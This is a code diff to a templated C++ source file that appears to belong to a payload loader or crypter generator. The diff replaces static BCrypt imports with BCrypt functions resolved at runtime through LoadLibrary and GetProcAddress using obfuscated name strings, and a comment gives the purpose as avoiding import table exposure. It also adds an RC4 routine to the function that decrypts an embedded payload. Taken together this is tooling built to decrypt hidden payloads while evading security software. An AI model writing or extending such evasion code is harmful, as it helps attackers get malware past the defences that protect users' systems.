@@ -8,36 +8,64 @@
 #include "obfuscate.hpp.in"
 
 {{#IF CRYPTO_CNG}}
-// Windows CNG (BCrypt) decryption
+// Windows CNG (BCrypt) decryption — dynamically resolved to avoid import table exposure
 #include <bcrypt.h>
-#pragma comment(lib, "bcrypt.lib")
+
+using BCryptOpenAlgorithmProvider_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
+using BCryptSetProperty_t = NTSTATUS(WINAPI*)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
+using BCryptGenerateSymmetricKey_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
+using BCryptDecrypt_t = NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
+using BCryptDestroyKey_t = NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE);
+using BCryptCloseAlgorithmProvider_t = NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE, ULONG);
+
+struct CngFunctions {
+    BCryptOpenAlgorithmProvider_t pOpen;
+    BCryptSetProperty_t pSetProp;
+    BCryptGenerateSymmetricKey_t pGenKey;
+    BCryptDecrypt_t pDecrypt;
+    BCryptDestroyKey_t pDestroyKey;
+    BCryptCloseAlgorithmProvider_t pClose;
+    bool valid;
+};
+
+static CngFunctions resolve_cng() {
+    CngFunctions f = {};
+    HMODULE hBcrypt = LoadLibraryW(obf_wide(L"bcrypt.dll"));
+    if (!hBcrypt) return f;
+    f.pOpen     = reinterpret_cast<BCryptOpenAlgorithmProvider_t>(GetProcAddress(hBcrypt, obf("BCryptOpenAlgorithmProvider")));
+    f.pSetProp  = reinterpret_cast<BCryptSetProperty_t>(GetProcAddress(hBcrypt, obf("BCryptSetProperty")));
+    f.pGenKey   = reinterpret_cast<BCryptGenerateSymmetricKey_t>(GetProcAddress(hBcrypt, obf("BCryptGenerateSymmetricKey")));
+    f.pDecrypt  = reinterpret_cast<BCryptDecrypt_t>(GetProcAddress(hBcrypt, obf("BCryptDecrypt")));
+    f.pDestroyKey = reinterpret_cast<BCryptDestroyKey_t>(GetProcAddress(hBcrypt, obf("BCryptDestroyKey")));
+    f.pClose    = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcAddress(hBcrypt, obf("BCryptCloseAlgorithmProvider")));
+    f.valid = f.pOpen && f.pSetProp && f.pGenKey && f.pDecrypt && f.pDestroyKey && f.pClose;
+    return f;
+}
 
 static bool decrypt_aes_ecb_cng(uint8_t* data, size_t data_len,
                                  const uint8_t* key, size_t key_len,
                                  uint8_t* out, size_t* out_len) {
+    auto cng = resolve_cng();
+    if (!cng.valid) return false;
+
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
-    NTSTATUS status;
 
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status)) return false;
-
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-        (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
-        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
-    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
-
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
-        (PUCHAR)key, (ULONG)key_len, 0);
-    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
+    if (!BCRYPT_SUCCESS(cng.pOpen(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
+    if (!BCRYPT_SUCCESS(cng.pSetProp(hAlg, BCRYPT_CHAINING_MODE,
+        (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0))) {
+        cng.pClose(hAlg, 0); return false;
+    }
+    if (!BCRYPT_SUCCESS(cng.pGenKey(hAlg, &hKey, NULL, 0,
+        (PUCHAR)key, (ULONG)key_len, 0))) { cng.pClose(hAlg, 0); return false; }
 
     ULONG result_len = 0;
-    status = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
+    NTSTATUS status = cng.pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
         NULL, NULL, 0, out, (ULONG)*out_len, &result_len, 0);
 
     *out_len = result_len;
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
+    cng.pDestroyKey(hKey);
+    cng.pClose(hAlg, 0);
     return BCRYPT_SUCCESS(status);
 }
 
@@ -45,32 +73,30 @@ static bool decrypt_aes_cbc_cng(uint8_t* data, size_t data_len,
                                  const uint8_t* key, size_t key_len,
                                  const uint8_t* iv,
                                  uint8_t* out, size_t* out_len) {
+    auto cng = resolve_cng();
+    if (!cng.valid) return false;
+
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
-    NTSTATUS status;
 
-    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status)) return false;
-
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
-
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
-        (PUCHAR)key, (ULONG)key_len, 0);
-    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
+    if (!BCRYPT_SUCCESS(cng.pOpen(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
+    if (!BCRYPT_SUCCESS(cng.pSetProp(hAlg, BCRYPT_CHAINING_MODE,
+        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
+        cng.pClose(hAlg, 0); return false;
+    }
+    if (!BCRYPT_SUCCESS(cng.pGenKey(hAlg, &hKey, NULL, 0,
+        (PUCHAR)key, (ULONG)key_len, 0))) { cng.pClose(hAlg, 0); return false; }
 
     uint8_t iv_copy[16];
     memcpy(iv_copy, iv, 16);
 
     ULONG result_len = 0;
-    status = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
+    NTSTATUS status = cng.pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
         NULL, iv_copy, 16, out, (ULONG)*out_len, &result_len, 0);
 
     *out_len = result_len;
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
+    cng.pDestroyKey(hKey);
+    cng.pClose(hAlg, 0);
     return BCRYPT_SUCCESS(status);
 }
 {{#ENDIF}}
@@ -234,6 +260,25 @@ static void decrypt_xor(uint8_t* data, size_t data_len,
         data[i] ^= key[i % key_len];
 }
 
+// RC4 stream cipher (symmetric — same operation for encrypt and decrypt)
+static void decrypt_rc4(uint8_t* data, size_t data_len,
+                         const uint8_t* key, size_t key_len) {
+    uint8_t S[256];
+    for (int i = 0; i < 256; i++) S[i] = static_cast<uint8_t>(i);
+    uint8_t j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = j + S[i] + key[i % key_len];
+        uint8_t tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+    }
+    uint8_t ii = 0, jj = 0;
+    for (size_t k = 0; k < data_len; k++) {
+        ii++;
+        jj += S[ii];
+        uint8_t tmp = S[ii]; S[ii] = S[jj]; S[jj] = tmp;
+        data[k] ^= S[static_cast<uint8_t>(S[ii] + S[jj])];
+    }
+}
+
 // PKCS7 unpadding
 static size_t pkcs7_unpad(uint8_t* data, size_t len) {
     if (len == 0) return 0;
@@ -252,6 +297,13 @@ static bool decrypt_payload(uint8_t* data, size_t data_len,
 {{#IF CIPHER_XOR}}
     memcpy(out, data, data_len);
     decrypt_xor(out, data_len, key, key_len);
+    *out_len = data_len;
+    return true;
+{{#ENDIF}}
+
+{{#IF CIPHER_RC4}}
+    memcpy(out, data, data_len);
+    decrypt_rc4(out, data_len, key, key_len);
     *out_len = data_len;
     return true;
 {{#ENDIF}}
